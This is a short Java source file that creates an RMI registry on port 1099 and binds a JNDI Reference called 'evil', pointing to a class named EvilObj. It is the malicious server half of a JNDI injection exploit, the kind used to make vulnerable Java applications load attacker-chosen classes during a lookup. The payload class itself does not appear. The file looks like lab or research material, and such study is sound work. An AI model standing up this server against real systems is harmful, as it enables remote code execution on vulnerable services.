package org.example.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiServer {
    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();

            System.out.println("Create RMI registry on port 1099");

            Reference reference = new Reference("com.example.rmi.EvilObj", "org.example.rmi.EvilObj", "");
            ReferenceWrapper wrapper = new ReferenceWrapper(reference);
            registry.bind("evil", wrapper);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
